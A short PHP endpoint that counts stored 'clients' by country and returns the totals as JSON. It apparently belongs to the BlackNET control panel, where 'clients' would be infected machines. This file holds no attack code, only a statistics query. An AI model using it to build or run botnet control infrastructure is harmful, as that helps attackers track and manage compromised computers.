<?php
header("Content-Type: application/json");
require_once '../config/config.php';
require_once APP_PATH . 'classes/Database.php';
require_once APP_PATH . 'classes/Utils.php';
require_once APP_PATH . 'classes/Clients.php';

$database = new BlackNET\Database();

$utils = new BlackNET\Utils();

$counter = new BlackNET\Clients($database, $utils);

$countries = $counter->getCountries();
$arrays = [];
foreach ($countries as $data => $value) {
    array_push(
        $arrays,
        [
            "id" => $data,
            "value" => $counter->countClientsByCond("country", $data)
        ]
    );
}
echo json_encode(["countries" => $arrays]);
